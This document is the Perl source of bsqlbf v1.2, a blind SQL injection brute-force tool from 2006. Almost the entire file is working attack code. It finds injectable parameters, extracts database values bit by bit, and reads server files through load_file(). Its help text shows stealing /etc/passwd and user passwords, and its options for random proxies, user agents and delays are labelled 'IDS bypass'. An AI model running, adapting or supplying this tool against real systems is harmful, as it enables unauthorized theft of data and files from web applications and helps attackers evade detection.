#!/usr/bin/perl
# Blind SQL Injection POC. aramosf@514.es // http://www.514.es
#
# CHANGELOG:
# Wed Jul 12 14:04:33 RST 2006
# + change sql teqneez mcdonalds powah 8) (more than 40% optimization)
#   please, rip me!!, make your own paper!! =]
# + support for windows files (for example: C:\\boot.ini)
# + support for " and 1="1 sql injection
# + -binary and -ascii support
# - -charset option removed
# - -dict option removed
# + upgrade to v1.2
# Sat Apr  1 03:13:01 CEST 2006
# + -get now support resume (with -start option)
# Thu Mar 30 02:06:41 CEST 2006
# -get to fetch files (thank you ilo AGAIN)
# ***** RELIABLE SPEED IMPROVEMENT USING SOME SKILLS OF SQL AND BRAIN!!***
# Sat Mar 25 13:57:39 CET 2006
# Release `haqerz edition` of bsqlbf:
# + -time option added (IDS bypass)
# + -rtime option added (IDS bypass)
# + -rproxy option added (IDS bypass)
# + -ruagent option added (IDS bypass)
# Sun Dec 11 11:01:34 CET 2005
# + fixed automatch in POSTs
# + better output
# Mon Dec  5 18:30:03 CET 2005
# + added -blind option (to specify which attribute have sql injection).
# Tue Nov 29 17:31:54 CET 2005
# + auto search match string (when they arent -match option)
# Mon Nov 28 16:34:09 CET 2005
# + Support for POST and GET methods (-method get // -method post).
# + Cookies support (-cookie "blah=foo; moo=doo").
# + UserAgent support (-uagent "SQL Blind tool").
# Wed Nov 23 23:44:23 RST 2005
# First version 0.1:
# + code ripped from www.reversing.org <ilo[at]reversing.org> (thanks!)
#
#
# TODO:
# [ ] Rip more code from others.

use LWP::UserAgent;
use Getopt::Long;
use IO::Handle;
use strict;
$| = 1;


###############################################################################
my $default_debug = 0;
my $default_length = 32;
my $default_method = "GET";
my $default_time = 0;
my $version = "1.2";
my $default_useragent = "bsqlbf $version";
my $default_sql = "version()";
###############################################################################


$| = 1;

my ($args, $solution);
my (%vars, @varsb);
my ($lastvar, $lastval);
my ($scheme, $authority, $path, $query, $fragment);
my ($head, $tail, $high);
my $hits = 0; 
my $amatch = 0;
my ($ua,$req);
my $furl;

###############################################################################
# Define GetOpt:
my ($url, $sql, $time, $rtime, $match, $uagent, $debug);
my ($proxy, $proxy_user, $proxy_pass,$rproxy, $ruagent); 
my ($start, $length, $method, $cookie, $blind);
my ($help, $get);
my ($ascii, $binary);

my $options = GetOptions (
  'help!'            => \$help, 
  'url=s'            => \$url,
  'get=s'            => \$get,
  'sql=s'            => \$sql,
  'blind=s'          => \$blind,
  'match=s'          => \$match,
  'start=s'          => \$start,
  'length=s'         => \$length,
  'method=s'	     => \$method,
  'uagent=s'	     => \$uagent,
  'ruagent=s'	     => \$ruagent,
  'cookie=s'	     => \$cookie,
  'proxy=s'          => \$proxy,
  'proxy_user=s'     => \$proxy_user,
  'proxy_pass=s'     => \$proxy_pass,
  'rproxy=s'         => \$rproxy,
  'debug!'           => \$debug, 
  'binary!'           =>\$binary, 
  'ascii!'           => \$ascii, 
  'rtime=s'          => \$rtime, 
  'time=i'           => \$time );

&help unless ($url);
&help if $help eq 1;

#########################################################################
# Default Options.
$uagent         ||= $default_useragent; 
$debug          ||= $default_debug; 
$length         ||= $default_length; 
$solution       ||= $start;
$method         ||= $default_method;
$sql            ||= $default_sql;
$time           ||= $default_time;

$ascii = 1 unless $binary;
&createlwp();
&parseurl();

if ( ! defined($blind)) {
		$lastvar = $varsb[$#varsb];
		$lastval = $vars{$lastvar};
} else {
		$lastvar = $blind;
		$lastval = $vars{$blind};
}

if (defined($cookie)) { &cookie() }

if (!$match) {
	print "\nTrying to find a match string...\n" if $debug == 1;
	$amatch = "1";
	$match = fmatch("$url"," AND 1=");
	if ($match eq "no vulnerable") { 
		print "\nNo vuln: 2nd..\n" if $debug ==1;
		$match = fmatch("$url","\' AND \'1\'=\'");
		$head = "\'";
		$tail = " AND \'1\'=\'1";
	};
	if ($match eq "no vulnerable") { 
		print "Not vulnerable or use -blind\n";
		exit 0; 
	} 
}

&banner();
&httpintro();


 
( ! $get) ? sqlget() : fileget();

sub getbyte {
   my $sql = $_[0];
   my $bit="";
   my @byte="";
   my $c=8;
   $high = 128 if $binary;
   if ($ascii) {
     $byte[0] = 0; 
     $high = 64;
   }
   for ($bit=1;$bit<=$high;$bit*=2) {
	my $val = "$head and (ord($sql) %26 $bit)=0 $tail";
	#print "VAL[$c] $val\n";
	if (lc($method) eq "post") {
		$vars{$lastvar} = $lastval . $val;
	}
	$furl = $url;
	$furl =~ s/($lastvar=$lastval)/$1$val/;
	&createlwp if $rproxy || $ruagent;
	my $html=fetch("$furl");
	$hits++;
    	foreach (split(/\n/,$html)) {
		if (/\Q$match\E/) { 
		    $byte[$c]=0;
		    last;
		 } else { $byte[$c] = 1; }
		
    	}
   $c--;
   }
   my $str = join("",@byte);
   #print "\nSTR: $str\n";
   return pack("B*","$str");

}

sub sqlget {
	my ($fsize,$i,$s);
        $s = "mid(length(length($sql)),1,1)";
	my $lng .= getbyte($s);
	for ($i=1;$i<=$lng;$i++) {
		$s = "mid(length($sql),$i,1)";
		$fsize.=getbyte($s);
	}
	
	$length = $fsize. "bytes";
	&bsqlintro();

	my $rsize = $start + 1;
	for ($i=$rsize;$i<=$fsize+1;$i++) {
		$s = "mid($sql,$i,1)";
		#print "S: $s\n";
		my $byte = getbyte($s);
		$solution .= $byte;
		print $byte;
 	}
}

sub fileget {
	my ($lget,$fstr);
	$fstr = retasc("$get");
	print "Trying to get file: $fstr\n" if $debug == 1;
	my $rsize = $start + 1;
	if (-e "$lget" && ! $start) { 
		$rsize = -s "$lget";
		print "Error: file ./$lget exists.\n"; 
		print "You can erase or resume it with: -start $rsize\n";
		exit 1
	}
	print "Start at: $rsize\n" if $debug == 1;
	my ($i,$fsize);
	$sql = "mid(length(length(load_file($fstr))),1,1)";
	my $lng .= getbyte($sql);
	for ($i=1;$i<=$lng;$i++) {
		my $find = 0;
		$sql = "mid(length(load_file($fstr)),$i,1)";
		$fsize.=getbyte($sql);
	}
	print "Size: $fsize\n" if $debug == 1;
	if ($fsize < "1") { print "Error: file not found, no permissions or ... who knows\n"; exit 1 }
	$length = $fsize. "bytes";
	# starting ..
	$sql = "load_file($fstr)";

	&bsqlintro();
	# Get file
	#print "---> $lget";
	open FILE, ">>$lget";
	FILE->autoflush(1);
	print "\n--- BEGIN ---\n";
	my ($i,$b,$fcontent);
	$rsize = 1 if $rsize < 1;
	for ($i=$rsize;$i<=$fsize+1;$i++) {
		my $find = 0;
		my ($furl, $b_start, $b_end, $z);
		$sql = "mid(load_file($fstr),$i,1)";
		$fcontent=getbyte($sql);
		print $fcontent;
		print FILE "$fcontent";
 	}
	print "\n--- END ---\n";
        close FILE;
	$solution = "success";
	$sql = "$get";
}

sub retasc
 {
   my $asc = "@_";
   my $ret = "";
   my @ascarray = split (//, $asc);
    foreach my $b (@ascarray) {
    $ret .= ord($b).",";
   }
    $ret =~ s/,$//g;
  return "CHAR($ret)";
}



&result();

#########################################################################
sub httpintro {
	my ($strcookie, $strproxy, $struagent, $strtime, $i);
	print "--[ http options ]"; print "-"x62; print "\n";
	printf ("%12s %-8s %11s %-20s\n","schema:",$scheme,"host:",$authority);
	if ($ruagent) { $struagent="rnd.file:$ruagent" } else { $struagent = $uagent }
	printf ("%12s %-8s %11s %-20s\n","method:",uc($method),"useragent:",$struagent);
	printf ("%12s %-50s\n","path:", $path);
	foreach (keys %vars) {
		$i++;
		printf ("%12s %-15s = %-40s\n","arg[$i]:",$_,$vars{$_});
	}
	if (! $cookie) { $strcookie="(null)" } else { $strcookie = $cookie; }
	printf ("%12s %-50s\n","cookies:",$strcookie);
	if (! $proxy && !$rproxy) { $strproxy="(null)" } else { $strproxy = $proxy; }
	if ($rproxy) { $strproxy = "rnd.file:$rproxy" }
	printf ("%12s %-50s\n","proxy_host:",$strproxy);
	if (! $proxy_user) { $strproxy="(null)" } else { $strproxy = $proxy_user; }
 	# timing
	if (! $time && !$rtime) { $strtime="0sec (default)" } 
	if ( $time == 0) { $strtime="0 sec (default)" } 
	if ( $time == 1) { $strtime="15 secs" } 
	if ( $time == 2) { $strtime="5 mins" } 
	if ($rtime) { $strtime = "rnd.time:$rtime" }
	printf ("%12s %-50s\n","time:",$strtime);
}

sub bsqlintro {
	my ($strstart, $strblind, $strlen, $strmatch, $strsql);
	print "\n--[ blind sql injection options ]"; print "-"x47; print "\n";
	if (! $start) { $strstart = "(null)"; } else { $strstart = $start; }
	if (! $blind) { $strblind = "(last) $lastvar"; } else { $strblind = $blind; }
	printf ("%12s %-15s %11s %-20s\n","blind:",$strblind,"start:",$strstart);
	if ($length eq $default_length) { $strlen = "$length (default)" } else { $strlen = $length; }
	if ($sql eq $default_sql) { $strsql = "$sql (default)"; } else { $strsql = $sql; }
	printf ("%12s %-15s %11s %-20s\n","length:",$strlen,"sql:",$strsql);
	if ($amatch eq 1) { $strmatch = "auto match:" } else { $strmatch = "match:"; }
	#printf ("%12s %-60s\n","$strmatch",$match);
	print " $strmatch $match\n";
	print "-"x80; print "\n\n";
}

#########################################################################

sub createlwp {
	my $proxyc;
	&getproxy;
	&getuagent if $ruagent;
	LWP::Debug::level('+') if $debug gt 3;
	$ua = new LWP::UserAgent(
        cookie_jar=> { file => "$$.cookie" }); 
	$ua->agent("$uagent");
	if (defined($proxy_user) && defined($proxy_pass)) {
		my ($pscheme, $pauthority, $ppath, $pquery, $pfragment) =
		$proxy =~ m|^(?:([^:/?#]+):)?(?://([^/?#]*))?([^?#]*)(?:\?([^#]*))?(?:#(.*))?|; 
		$proxyc = $pscheme."://".$proxy_user.":".$proxy_pass."@".$pauthority;
	} else { $proxyc = $proxy; }
	
	$ua->proxy(['http'] => $proxyc) if $proxy;
	undef $proxy if $rproxy;
	undef $uagent if $ruagent;
}	

sub cookie {
	# Cookies check
	if ($cookie || $cookie =~ /; /) {
		foreach my $c (split /;/, $cookie) {
			my ($a,$b) = split /=/, $c;
			if ( ! $a || ! $b ) { die "Wrong cookie value. Use -h for help\n"; }
		}
	}
}

sub parseurl {
 ###############################################################################
 # Official Regexp to parse URI. Thank you somebody.
	($scheme, $authority, $path, $query, $fragment) =
		$url =~ m|^(?:([^:/?#]+):)?(?://([^/?#]*))?([^?#]*)(?:\?([^#]*))?(?:#(.*))?|; 
	# Parse args of URI into %vars and @varsb.
	foreach my $varval (split /&/, $query) {
		my ($var, $val) = split /=/, $varval;
		$vars{$var} = $val;
		push(@varsb, $var);
	}
}


#########################################################################
# Show options at running:
sub banner {
	print "\n // Blind SQL injection brute force.\n";
	print " // aramosf\@514.es / http://www.514.es\n\n";
}


#########################################################################
# Get differences in HTML
sub fmatch {
 my ($ok,$rtrn);
 my ($furla, $furlb,$quote) = ($_[0], $_[0],$_[1]);
 my ($html_a, $html_b);
 print "url-a: $furla\n" if $debug == 1;
 print "url-b: $furlb\n" if $debug == 1;
 if (lc($method) eq "get") {
	$furla =~ s/($lastvar=$lastval)/$1 ${quote}1/;
	$furlb =~ s/($lastvar=$lastval)/$1 ${quote}0/;
 	$html_a = fetch("$furla");
	$html_b = fetch("$furlb");
 } elsif (lc($method) eq "post") {
   $vars{$lastvar} = $lastval . " ${quote}1";
   $html_a = fetch("$furla");
   $vars{$lastvar} = $lastval . " ${quote}0";
   $html_b = fetch("$furla");
   $vars{$lastvar} = $lastval;
 }


 #print "$html_a";
 #print "$html_b";

 if ($html_a eq $html_b) {
  $rtrn = "no vulnerable";
  return $rtrn;
 }


 my @h_a = split(/\n/,$html_a);
 my @h_b = split(/\n/,$html_b);
 foreach my $a (@h_a) {
	$ok = 0;
	if ($a =~ /\w/) {
   		foreach (@h_b) {
		    if ($a eq $_) {$ok = 1; }
		}
	} else { $ok = 1; }
   $rtrn = $a;
   last if $ok ne 1;
 }
 return $rtrn;
}


#########################################################################
# Fetch HTML from WWW
sub fetch {
	my $secs;
	if ($time == 0) { $secs = 0 }
	elsif ($time == 1) { $secs = 15 }
	elsif ($time == 2) { $secs = 300 }
	if ($rtime =~ /\d*-\d*/ && $time == 0) {
		my ($l,$p) = $rtime =~ m/(\d+-\d+)/;
		srand; $secs = int(rand($p-$l+1))+$l;
	} elsif ($rtime =~ /\d*-\d*/ && $time != 0) {
		print "You can't run with -time and -rtime. See -help.\n";
		exit 1;
	}
	sleep $secs;
	
	my $res;
	if (lc($method) eq "get") {
		my $fetch = $_[0];
		print "GET: $fetch\n" if $debug == 1;
		if ($cookie) {
			$res = $ua->get("$fetch", Cookie => "$cookie");
		} elsif (!$cookie) {
			$res = $ua->get("$fetch");
		}
	} elsif (lc($method) eq "post") {
		my($s, $a, $p, $q, $f) =
  	    $url=~m|^(?:([^:/?#]+):)?(?://([^/?#]*))?([^?#]*)(?:\?([^#]*))?(?:#(.*))?|; 
		my $fetch = "$s://$a".$p;
		if ($cookie) {
		print "POST: $fetch\n" if $debug == 1;
	    	$res = $ua->post("$fetch",\%vars, Cookie => "$cookie");
		} elsif (!$cookie) {
		    $res = $ua->post("$fetch",\%vars);
		}
	} else {
		die "Wrong httpd method. Use -h for help\n";
	}
	my $html = $res->content();
	return $html;
}


sub getproxy {
	if ($rproxy && $proxy !~ /http/) {
		my @lproxy;
		open PROXY, $rproxy or die "Can't open file: $rproxy\n";
		while(<PROXY>) { push(@lproxy,$_) if ! /^#/ }
		close PROXY;
		srand; my $ind = rand @lproxy;
		$proxy = $lproxy[$ind];
	} elsif ($rproxy && $proxy =~ /http/)  {
		print "You can't run with -proxy and -rproxy. See -help.\n";
		exit 1;
	}
}

sub getuagent {
		my @uproxy;
		open UAGENT, $ruagent or die "Can't open file: $ruagent\n";
		while(<UAGENT>) { push(@uproxy,$_) if ! /^#/ }
		close UAGENT;
		srand; my $ind = rand @uproxy;
		$uagent = $uproxy[$ind];
		chop($uagent);
}

sub result {
	print "\r results:                                  \n" .
	 " $sql = $solution\n" if length($solution) > 0; 
	print " total hits: $hits\n";
}


sub help {
	&banner();
	print " usage: $0 <-url http://www.host.com/path/script.php?foo=bar> [options]\n";
	print "\n options:\n";
	print " -sql:\t\tvalid SQL syntax to get; connection_id(), database(),\n";
	print "\t\tsystem_user(), session_user(), current_user(), last_insert_id(),\n"; 
	print "\t\tuser() or all data available in the requested query, for\n";
	print "\t\texample: user.password. Default: version()\n";
	print " -get:\t\tfile to get.\n";
	print " -blind:\tparameter to inject sql. Default is last value of url\n";
	print " -match:\tstring to match in valid query, Default is try to get auto\n";
	print " -start:\tif you know the beginning of the string, use it.\n";
	print " -length:\tmaximum length of value. Default is $default_length.\n";
	print " -time:\t\ttimer options:\n";
	print " \t0:\tdont wait. Default option.\n";
	print " \t1:\twait 15 seconds\n";
	print " \t2:\twait 5 minutes\n";
	print " -rtime:\twait random seconds, for example: \"10-20\".\n";
	print " -method:\thttp method to use; get or post. Default is $default_method.\n";
	print " -uagent:\thttp UserAgent header to use. Default is $default_useragent\n";
	print " -ruagent:\tfile with random http UserAgent header to use.\n";
	print " -cookie:\thttp cookie header to use\n";
	print " -rproxy:\tuse random http proxy from file list.\n";
	print " -proxy:\tuse proxy http. Syntax: -proxy=http://proxy:port/\n";
	print " -proxy_user:\tproxy http user\n";
	print " -proxy_pass:\tproxy http password\n";
    print "\n examples:\n bash# $0 -url http://www.somehost.com/blah.php?u=5 -blind u -sql \"user()\"\n";
    print " bash# $0 -url http://www.buggy.com/bug.php?r=514&p=3 -get \"/etc/passwd\"\n";
    exit(1);
}


